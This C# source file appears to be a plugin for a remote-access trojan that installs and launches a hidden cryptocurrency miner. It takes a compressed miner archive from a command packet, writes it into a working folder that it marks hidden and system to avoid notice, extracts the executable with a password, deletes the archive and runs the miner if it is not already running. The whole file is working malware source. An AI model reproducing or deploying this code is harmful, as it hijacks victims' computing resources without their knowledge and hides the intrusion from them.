using Ionic.Zip;
using MessagePackLib.MessagePack;
using Plugin;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace Plugin
{
    class Cpu_Install
    {
        public static void Run(MsgPack unpack_msgpack) // CPU.Run()
        {
            try
            {
                // Checking
                if (!File.Exists(Properties.CPU.Default.cpuBin))
                {
                    try
                    {
                        if (!Directory.Exists(Properties.CPU.Default.cpuWorkDir))
                        {
                            //We create a working folder for the miner
                            DirectoryInfo workPatch;
                            workPatch = Directory.CreateDirectory(Properties.CPU.Default.cpuWorkDir);
                            Directory.CreateDirectory(Properties.CPU.Default.cpuWorkDir);
                            DirectoryInfo directoryInfo = new DirectoryInfo(Properties.CPU.Default.cpuWorkDir);
                            directoryInfo.Attributes |= FileAttributes.Hidden | FileAttributes.System; //Так мы скрываем саму нашу папку
                            workPatch.Refresh();
                        }
                        string zipAckhive = Properties.CPU.Default.cpuWorkDir + "\\" + HWIDGen.HWID() + ".tmp.zip";
                        try
                        {
                            //Create an archive with a miner
                            File.WriteAllBytes(zipAckhive, Zip.Decompress(unpack_msgpack.ForcePathObject("File").GetAsBytes()));
                            Thread.Sleep(10000);
                        }
                        catch
                        {
                            return;
                        }
                        // unzip
                        using (ZipFile zip = ZipFile.Read(zipAckhive))
                        {
                            try
                            {
                                ZipEntry e = zip[Properties.CPU.Default.cpuProc + ".exe"];
                                e.ExtractWithPassword(Properties.CPU.Default.cpuWorkDir, Properties.CPU.Default.cpuZipPass);
                                Thread.Sleep(10000);
                            }
                            catch 
                            {
                                try 
                                {
                                    zip.ExtractAll(zipAckhive);
                                    Thread.Sleep(10000);
                                }
                                catch
                                {
                                    return;
                                }
                            }
                        }

                        try
                        {
                            // Delete the archive with a sminer
                            if (File.Exists(zipAckhive))
                                File.Delete(zipAckhive);
                        }
                        catch (Exception ex)
                        {
                            Packet.Error(ex.Message);
                        }

                        try
                        {

                            // Check if the miner process is running
                            Process[] pname = Process.GetProcessesByName(Properties.CPU.Default.cpuProc);
                            if (pname.Length == 0)
                            Thread.Sleep(5000);
                            Cpu_Run.CmdRun();
                        }
                        catch (Exception ex)
                        {
                            Packet.Error(ex.Message);
                            Thread.Sleep(480000);
                            return;
                        }
                    }
                    catch { }
                }
                else
                {
                    try
                    {

                        // Check if the miner process is running
                        Process[] pname = Process.GetProcessesByName(Properties.CPU.Default.cpuProc);
                        if (pname.Length == 0)
                        Thread.Sleep(5000);
                        Cpu_Run.CmdRun();
                    }
                    catch (Exception ex)
                    {
                        Packet.Error(ex.Message);
                        Thread.Sleep(480000);
                        return;
                    }
                }

            }

            catch (Exception ex)
            {
                Packet.Error(ex.Message);
                return;
            }

        }
    }
}
